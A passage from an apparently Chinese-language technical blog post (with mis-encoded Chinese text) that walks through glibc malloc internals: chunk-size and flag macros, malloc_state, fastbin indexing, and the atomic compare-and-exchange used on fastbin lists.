<h5 id="æœ€å°chunkå¤§å°"><a href="#æœ€å°chunkå¤§å°" class="headerlink" title="æœ€å°chunkå¤§å°"></a>æœ€å°chunkå¤§å°</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* The smallest possible chunk */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MIN_CHUNK_SIZE (offsetof(struct malloc_chunk, fd_nextsize))</span></span><br></pre></td></tr></table></figure>

<p><code>offsetof(struct,struct.member);</code>ä½œç”¨æ˜¯è®¡ç®—memberæˆå‘˜åœ¨å…¶æ‰€åœ¨çš„ç»“æ„ä½“structä¸­çš„åç§»é‡</p>
<p>è¿™è¡¨æ˜æœ€å°çš„chunkè‡³å°‘è¦åŒ…å«å‰å››ä¸ªæˆå‘˜,prev_size,size,fd,bk,åé¢ä¸¤ä¸ªå¯ä»¥æ²¡æœ‰</p>
<h5 id="æœ€å°ç”³è¯·çš„å †å†…å­˜å¤§å°"><a href="#æœ€å°ç”³è¯·çš„å †å†…å­˜å¤§å°" class="headerlink" title="æœ€å°ç”³è¯·çš„å †å†…å­˜å¤§å°"></a>æœ€å°ç”³è¯·çš„å †å†…å­˜å¤§å°</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* The smallest size we can malloc is an aligned minimal chunk */</span></span><br><span class="line"><span class="comment">//MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MINSIZE                                                                \</span></span><br><span class="line"><span class="meta">    (unsigned long) (((MIN_CHUNK_SIZE + MALLOC_ALIGN_MASK) &amp;                   \</span></span><br><span class="line"><span class="meta">                      ~MALLOC_ALIGN_MASK))</span></span><br></pre></td></tr></table></figure>

<h5 id="æ£€æŸ¥å¯¹é½"><a href="#æ£€æŸ¥å¯¹é½" class="headerlink" title="æ£€æŸ¥å¯¹é½"></a>æ£€æŸ¥å¯¹é½</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Check if m has acceptable alignment */</span></span><br><span class="line"><span class="comment">// MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> aligned_OK(m) (((unsigned long) (m) &amp; MALLOC_ALIGN_MASK) == 0)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> misaligned_chunk(p)                                                    \</span></span><br><span class="line"><span class="meta">    ((uintptr_t)(MALLOC_ALIGNMENT == 2 * SIZE_SZ ? (p) : chunk2mem(p)) &amp;       \</span></span><br><span class="line"><span class="meta">     MALLOC_ALIGN_MASK)</span></span><br></pre></td></tr></table></figure>

<h5 id="åˆ¤æ–­ç”¨æˆ·è¯·æ±‚æ˜¯å¦ç¦»è°±"><a href="#åˆ¤æ–­ç”¨æˆ·è¯·æ±‚æ˜¯å¦ç¦»è°±" class="headerlink" title="åˆ¤æ–­ç”¨æˆ·è¯·æ±‚æ˜¯å¦ç¦»è°±"></a>åˆ¤æ–­ç”¨æˆ·è¯·æ±‚æ˜¯å¦ç¦»è°±</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Check if a request is so large that it would wrap around zero when</span></span><br><span class="line"><span class="comment">   padded and aligned. To simplify some other code, the bound is made</span></span><br><span class="line"><span class="comment">   low enough so that adding MINSIZE will also not wrap around zero.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> REQUEST_OUT_OF_RANGE(req)                                              \</span></span><br><span class="line"><span class="meta">    ((unsigned long) (req) &gt;= (unsigned long) (INTERNAL_SIZE_T)(-2 * MINSIZE))</span></span><br></pre></td></tr></table></figure>

<h5 id="è§„èŒƒåŒ–è¯·æ±‚å¤§å°"><a href="#è§„èŒƒåŒ–è¯·æ±‚å¤§å°" class="headerlink" title="è§„èŒƒåŒ–è¯·æ±‚å¤§å°"></a>è§„èŒƒåŒ–è¯·æ±‚å¤§å°</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* pad request bytes into a usable size -- internal version */</span></span><br><span class="line"><span class="comment">//MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> request2size(req)                                                      \</span></span><br><span class="line"><span class="meta">    (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)                           \</span></span><br><span class="line"><span class="meta">         ? MINSIZE                                                             \<span class="comment">//å¦‚æœç”¨æˆ·è¯·æ±‚çš„å¤ªå°åˆ™ç›´æ¥ç”¨MINSIZE</span></span></span><br><span class="line">         : ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)<span class="comment">//å¦åˆ™å‘ä¸Šå–æ•´åˆ°æ»¡è¶³å¯¹é½è¦æ±‚</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*  Same, except also perform argument check */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> checked_request2size(req, sz)                                          \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (REQUEST_OUT_OF_RANGE(req)) &#123;                                           \</span></span><br><span class="line"><span class="meta">        __set_errno(ENOMEM);                                                   \</span></span><br><span class="line"><span class="meta">        return 0;                                                              \</span></span><br><span class="line"><span class="meta">    &#125;                                                                          \</span></span><br><span class="line"><span class="meta">    (sz) = request2size(req);</span></span><br></pre></td></tr></table></figure>

<h5 id="è®¾ç½®sizeæœ€ä½ä¸‰ä½æ ‡å¿—ä½"><a href="#è®¾ç½®sizeæœ€ä½ä¸‰ä½æ ‡å¿—ä½" class="headerlink" title="è®¾ç½®sizeæœ€ä½ä¸‰ä½æ ‡å¿—ä½"></a>è®¾ç½®sizeæœ€ä½ä¸‰ä½æ ‡å¿—ä½</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* size field is or&#x27;ed with PREV_INUSE when previous adjacent chunk in use */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PREV_INUSE 0x1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* extract inuse bit of previous chunk */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> prev_inuse(p) ((p)-&gt;mchunk_size &amp; PREV_INUSE)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* size field is or&#x27;ed with IS_MMAPPED if the chunk was obtained with mmap() */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IS_MMAPPED 0x2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* check for mmap()&#x27;ed chunk */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> chunk_is_mmapped(p) ((p)-&gt;mchunk_size &amp; IS_MMAPPED)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* size field is or&#x27;ed with NON_MAIN_ARENA if the chunk was obtained</span></span><br><span class="line"><span class="comment">   from a non-main arena.  This is only set immediately before handing</span></span><br><span class="line"><span class="comment">   the chunk to the user, if necessary.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NON_MAIN_ARENA 0x4</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Check for chunk from main arena.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> chunk_main_arena(p) (((p)-&gt;mchunk_size &amp; NON_MAIN_ARENA) == 0)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Mark a chunk as not being on the main arena.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_non_main_arena(p) ((p)-&gt;mchunk_size |= NON_MAIN_ARENA)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Bits to mask off when extracting size</span></span><br><span class="line"><span class="comment">   Note: IS_MMAPPED is intentionally not masked off from size field in</span></span><br><span class="line"><span class="comment">   macros for which mmapped chunks should never be seen. This should</span></span><br><span class="line"><span class="comment">   cause helpful core dumps to occur if it is tried by accident by</span></span><br><span class="line"><span class="comment">   people extending or adapting this malloc.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SIZE_BITS (PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)</span></span><br></pre></td></tr></table></figure>

<h5 id="è·å–æœ¬chunk-size"><a href="#è·å–æœ¬chunk-size" class="headerlink" title="è·å–æœ¬chunk size"></a>è·å–æœ¬chunk size</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Get size, ignoring use bits */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> chunksize(p) (chunksize_nomask(p) &amp; ~(SIZE_BITS))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Like chunksize, but do not mask SIZE_BITS.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> chunksize_nomask(p) ((p)-&gt;mchunk_size)</span></span><br></pre></td></tr></table></figure>

<p>å¦‚æœæƒ³è¦è·å¾—çº¯çœŸçš„size,æœ€ä½ä¸‰ä½åº”è¯¥å¿½ç•¥æ ‡å¿—ä½çš„å½±å“,å› æ­¤chunksizeä¸­ç”¨SIZE_BITSå–åå¾—åˆ°ç¬¬ä¸‰ä½å…¨æ˜¯0ç„¶åæŒ‰ä½ä¸,ç¡®ä¿è·å¾—çš„sizeä½ä¸‰ä½å¿…ä¸º0</p>
<p>è€Œchunksize_nomaskå°±æ²¡æœ‰å¿½ç•¥,ç›¸å½“äºç›´æ¥åŒºçš„malloc_structçš„ç¬¬äºŒä¸ªæˆå‘˜</p>
<h5 id="ä½¿ç”¨çŠ¶æ€"><a href="#ä½¿ç”¨çŠ¶æ€" class="headerlink" title="ä½¿ç”¨çŠ¶æ€"></a>ä½¿ç”¨çŠ¶æ€</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* extract p&#x27;s inuse bit */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> inuse(p)                                                               \</span></span><br><span class="line"><span class="meta">    ((((mchunkptr)(((char *) (p)) + chunksize(p)))-&gt;mchunk_size) &amp; PREV_INUSE)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* set/clear chunk as being inuse without otherwise disturbing */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_inuse(p)                                                           \</span></span><br><span class="line"><span class="meta">    ((mchunkptr)(((char *) (p)) + chunksize(p)))-&gt;mchunk_size |= PREV_INUSE</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> clear_inuse(p)                                                         \</span></span><br><span class="line"><span class="meta">    ((mchunkptr)(((char *) (p)) + chunksize(p)))-&gt;mchunk_size &amp;= ~(PREV_INUSE)</span></span><br></pre></td></tr></table></figure>

<h5 id="sizeå¤§å°"><a href="#sizeå¤§å°" class="headerlink" title="sizeå¤§å°"></a>sizeå¤§å°</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Set size at head, without disturbing its use bit */</span></span><br><span class="line"><span class="comment">// SIZE_BITS = 7</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_head_size(p, s)                                                    \</span></span><br><span class="line"><span class="meta">    ((p)-&gt;mchunk_size = (((p)-&gt;mchunk_size &amp; SIZE_BITS) | (s)))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Set size/use field */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_head(p, s) ((p)-&gt;mchunk_size = (s))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Set size at footer (only when chunk is not in use) */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> set_foot(p, s)                                                         \</span></span><br><span class="line"><span class="meta">    (((mchunkptr)((char *) (p) + (s)))-&gt;mchunk_prev_size = (s))</span></span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œset_footå¹²äº†å•¥?</p>
<p>pæ˜¯chunkæŒ‡é’ˆ,sæ˜¯è¯¥chunkçš„å¤§å°,p+så°±æŒ‡å‘äº†æœ¬chunkçš„ç»“å°¾,</p>
<p>ä¹Ÿå°±æ˜¯ä¸‹ä¸€ä¸ªchunkçš„åŸºåœ°å€,ä¹Ÿå°±æ˜¯ä¸‹ä¸€ä¸ªchunkçš„prev_sizeæˆå‘˜,</p>
<p>äºæ˜¯p+så¼ºè½¬ä¸ºä¸€ä¸ªmalloc_chunkç±»å‹æŒ‡é’ˆ,</p>
<p>ç„¶åå–å…¶ç¬¬ä¸€ä¸ªæˆå‘˜ä¹Ÿå°±æ˜¯prev_size,å†™ä¸Šæœ¬chunkçš„å¤§å°</p>
<h5 id="æŒ‡å®šåç§»å¤„è®¤ä¸ºæ˜¯ä¸€ä¸ªchunk"><a href="#æŒ‡å®šåç§»å¤„è®¤ä¸ºæ˜¯ä¸€ä¸ªchunk" class="headerlink" title="æŒ‡å®šåç§»å¤„è®¤ä¸ºæ˜¯ä¸€ä¸ªchunk"></a>æŒ‡å®šåç§»å¤„è®¤ä¸ºæ˜¯ä¸€ä¸ªchunk</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Treat space at ptr + offset as a chunk */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> chunk_at_offset(p, s) ((mchunkptr)(((char *) (p)) + (s)))</span></span><br></pre></td></tr></table></figure>

<p>pæŒ‡é’ˆåŠ ä¸Šsåç§»é‡çš„åœ°å€è§†ä¸ºä¸€ä¸ªchunkçš„åŸºåœ°å€,è¿”å›ä¸€ä¸ªmalloc_chunk*æŒ‡é’ˆ</p>
<h3 id="malloc-state"><a href="#malloc-state" class="headerlink" title="malloc_state"></a>malloc_state</h3><p>åˆ†é…åŒºç»“æ„,ä¸€ä¸ªè¿›ç¨‹åªèƒ½æœ‰ä¸€ä¸ªä¸»åˆ†é…åŒº,å¯ä»¥å¯ä»¥æœ‰å¤šä¸ªéä¸»åˆ†é…åŒº</p>
<p>å½“æŸä¸ªçº¿ç¨‹è¯•å›¾ç”¨<code>malloc</code>åŠ¨æ€ç”³è¯·å†…å­˜æ—¶,ä¼šé¦–å…ˆå¯¹ä¸€ä¸ªåˆ†é…åŒºä¸Šé”,å¦‚æœä¸»åˆ†é…åŒºå¿™åˆ™æ²¿ç€<code>malloc_state-&gt;next</code>å¯»æ‰¾ä¸‹ä¸€ä¸ªåˆ†é…åŒº,ç›´åˆ°æ‰¾åˆ°ä¸€ä¸ªé—²çš„åˆ†é…åŒºä¸Šé”ä½¿ç”¨.å¦‚æœè½¬ä¸€åœˆæ²¡å‘ç°é—²çš„åˆ†é…åŒºåˆ™åˆ›å»ºæ–°çš„éä¸»åˆ†é…åŒº,ç„¶åå°†å…¶åŠ å…¥åˆ°è¿™ä¸ªåˆ†é…åŒºç¯çŠ¶é“¾è¡¨ä¸­ä¸Šé”ä½¿ç”¨.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> &#123;</span></span><br><span class="line">  <span class="comment">/* Serialize access.  */</span></span><br><span class="line">  <span class="type">mutex_t</span> mutex;<span class="comment">//äº’æ–¥é”,ä¿è¯ä¸´ç•ŒåŒºåªæœ‰ä¸€ä¸ªçº¿ç¨‹è®¿é—®</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Flags (formerly in max_fast).  */</span></span><br><span class="line">  <span class="type">int</span> flags;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Fastbins */</span></span><br><span class="line">  mfastbinptr      fastbins[NFASTBINS];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Base of the topmost chunk -- not otherwise kept in a bin */</span></span><br><span class="line">  mchunkptr        top;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The remainder from the most recent split of a small request */</span></span><br><span class="line">  mchunkptr        last_remainder;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">  mchunkptr        bins[NBINS * <span class="number">2</span> - <span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Bitmap of bins */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span>     binmap[BINMAPSIZE];</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Linked list */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span></span><br><span class="line">	...</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­ç®¡ç†å †å—çš„æ‰‹æ®µæœ‰fastbin,topchunk,unsortedbin,smallbins,largebinsè¿™ä¹ˆå‡ ç§</p>
<p>åªè€ƒè™‘å•çº¿ç¨‹çš„æƒ…å†µ,ä¹Ÿå°±æ˜¯è¯´ä¸ä¼šäº§ç”Ÿéä¸»åˆ†é…åŒº,åªä½¿ç”¨ä¸»åˆ†é…åŒº</p>
<p>æœ€åˆåªæœ‰å¾ˆå¤§ä¸€å—topchunk,åˆšå¼€å§‹çš„mallocç”³è¯·éƒ½æ˜¯ç›´æ¥åœ¨mallocä¸Šåˆ‡å‰²ä½¿ç”¨</p>
<p>freeé‡Šæ”¾æ—¶,å¦‚æœå¯¹åº”å †å—è½åœ¨fastbinèŒƒå›´å†…åˆ™æ”¾åˆ°fastbinå¯¹åº”çš„é“¾è¡¨ä¸­</p>
<p>å¦åˆ™ä¸€å¾‹æ”¾åˆ°unsortedbinä¸­,ç­‰åé¢å†æ¬¡mallocæ—¶åˆ‡å‰²æˆ–è€…åˆå¹¶æˆ–è€…åˆ†æ‹£</p>
<h4 id="fastbins"><a href="#fastbins" class="headerlink" title="fastbins"></a>fastbins</h4><p>åªä¼šä½¿ç”¨fdæŒ‡é’ˆçš„å•å‘é“¾è¡¨</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">flowchart LR</span><br><span class="line">A[&quot;fastbin[x]&quot;]</span><br><span class="line">A--fd--&gt;a--fd--&gt;b--fd--&gt;c</span><br></pre></td></tr></table></figure>



<h5 id="max-fast"><a href="#max-fast" class="headerlink" title="max_fast"></a>max_fast</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> set_max_fast(s) \</span></span><br><span class="line"><span class="meta">  global_max_fast = (((s) == 0)						      \</span></span><br><span class="line"><span class="meta">                     ? SMALLBIN_WIDTH : ((s + SIZE_SZ) &amp; ~MALLOC_ALIGN_MASK))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> get_max_fast() global_max_fast</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> INTERNAL_SIZE_T global_max_fast;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MALLOC_ALIGN_MASK      (MALLOC_ALIGNMENT - 1)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MALLOC_ALIGNMENT       (2 *SIZE_SZ &lt; __alignof__ (long double)      \</span></span><br><span class="line"><span class="meta">                                  ? __alignof__ (long double) : 2 *SIZE_SZ)</span></span><br></pre></td></tr></table></figure>

<p>å¯¹äºx64å¹³å°,SIZE_SZ&#x3D;8,</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">MALLOC_ALIGNMENT=2*SIZE_SZ=16=0b 10000</span><br><span class="line">MALLOC_ALIGN_MASK=15=0b 1111</span><br><span class="line"> ~MALLOC_ALIGN_MASK=111...111 0000</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ª<code>global_max_fast</code>åœ¨<code>malloc_init_state</code>æ—¶æœŸè¢«åˆå§‹åŒ–</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if (av == &amp;main_arena)</span><br><span class="line">  set_max_fast (DEFAULT_MXFAST);</span><br><span class="line">  </span><br><span class="line">#define DEFAULT_MXFAST     (64 * SIZE_SZ / 4)</span><br></pre></td></tr></table></figure>

<p>å¯¹äº<code>x64</code>å¹³å°,<code>SIZE_SZ=8</code>,é‚£ä¹ˆ<code>DEFAULT_MXFAST=128</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">set_max_fast(128):</span><br><span class="line">	  global_max_fast = ((128 + 8) &amp; 111...111 0000))</span><br><span class="line">	  =0b10001000&amp;0b111...111 0000</span><br><span class="line">	  =0b10000000</span><br><span class="line">	  =128</span><br></pre></td></tr></table></figure>

<p>ä¹Ÿå°±æ˜¯è¯´,<code>nb&lt;=128</code>æ‰å¯èƒ½åœ¨fastbinä¸­å–å †å—</p>
<h5 id="fastbin-index"><a href="#fastbin-index" class="headerlink" title="fastbin_index"></a>fastbin_index</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> fastbin_index(sz)  ((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)</span></span><br></pre></td></tr></table></figure>

<p>åœ¨x64å¹³å°ä¸Š,<code>SIZE_SZ=8</code>,è€Œåœ¨x86å¹³å°ä¸Š<code>SIZE_SZ=4</code></p>
<p>å¦‚æœåœ¨x64å¹³å°ä¸Š,åˆ™å°†szå³ç§»4ä½,ç›¸å½“äºé™¤ä»¥16,ç„¶å-2,</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fastbin_index(sz)</span><br><span class="line">	=sz &gt;&gt; 4 - 2</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>sz</th>
<th>fastbin_index(sz) on x64</th>
</tr>
</thead>
<tbody><tr>
<td><code>[0b100000,0b110000)=[32,48)</code></td>
<td>0</td>
</tr>
<tr>
<td><code>[0b110000,0b1000000)=[48,64)</code></td>
<td>1</td>
</tr>
<tr>
<td><code>[0b1000000,0b1010000)=[64,80)</code></td>
<td>2</td>
</tr>
</tbody></table>
<p>æ¯”å¦‚ç”¨æˆ·æœŸæœ›åˆ†é…0x10å¤§å°çš„ç©ºé—´,é‚£ä¹ˆå®é™…ä¸Šçš„å †å—å¤§å°æ˜¯32å­—èŠ‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fastbin_index(0b100000)</span><br><span class="line">	=0b100000&gt;&gt;4 -2</span><br><span class="line">	=0b10-2</span><br><span class="line">	=0</span><br></pre></td></tr></table></figure>

<h5 id="fastbin-idx"><a href="#fastbin-idx" class="headerlink" title="fastbin[idx]"></a>fastbin[idx]</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> fastbin(ar_ptr, idx) ((ar_ptr)-&gt;fastbinsY[idx])</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>fastbinsç»“æ„</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">typedef struct malloc_chunk *mfastbinptr;</span><br><span class="line">...</span><br><span class="line">struct malloc_state&#123;</span><br><span class="line">	...</span><br><span class="line">mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>fastbinsæ˜¯ä¸€ä¸ªé“¾æ ˆ,å…ˆé‡Šæ”¾çš„å †å—ä¹Ÿä¼šå…ˆè¢«å†æ¬¡åˆ†é…</p>
</blockquote>
<p>ä¹Ÿå°±æ˜¯è¯´<code>mfastbinptr *fb = &amp;fastbin (av, idx);</code></p>
<p>è¿™æ ˆä¸­çš„æŒ‡é’ˆå˜é‡fbæŒ‡å‘æ¡¶å­å¤´çš„åœ°å€,æ¡¶å­å¤´æŒ‡å‘è¯¥æ¡¶å­ä¸­çš„ç¬¬ä¸€ä¸ªå †å—</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">flowchart LR</span><br><span class="line">A[&quot;fastbin[x] @malloc_state&quot;]</span><br><span class="line">a2[&quot;1st chunk @heap&quot;]</span><br><span class="line">a1[&quot;2nd chunk @heap&quot;]</span><br><span class="line">a0[&quot;3rd chunk @heap&quot;]</span><br><span class="line">fb[&quot;fbå¥æŸ„ @stack&quot;]----&gt;A--fd--&gt;a2--fd--&gt;a1--fd--&gt;a0</span><br></pre></td></tr></table></figure>







<h5 id="catomic-compare-and-exchange-val-acq-fb-victim-fd-victim"><a href="#catomic-compare-and-exchange-val-acq-fb-victim-fd-victim" class="headerlink" title="catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim)"></a>catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim)</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#  <span class="keyword">define</span> catomic_compare_and_exchange_val_acq(mem, newval, oldval) \</span></span><br><span class="line"><span class="meta">  atomic_compare_and_exchange_val_acq (mem, newval, oldval)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> atomic_compare_and_exchange_val_acq(mem, newval, oldval) \</span></span><br><span class="line"><span class="meta">  (&#123; __typeof (mem) __gmemp = (mem);				      \</span></span><br><span class="line"><span class="meta">     __typeof (*mem) __gret = *__gmemp;				      \</span></span><br><span class="line"><span class="meta">     __typeof 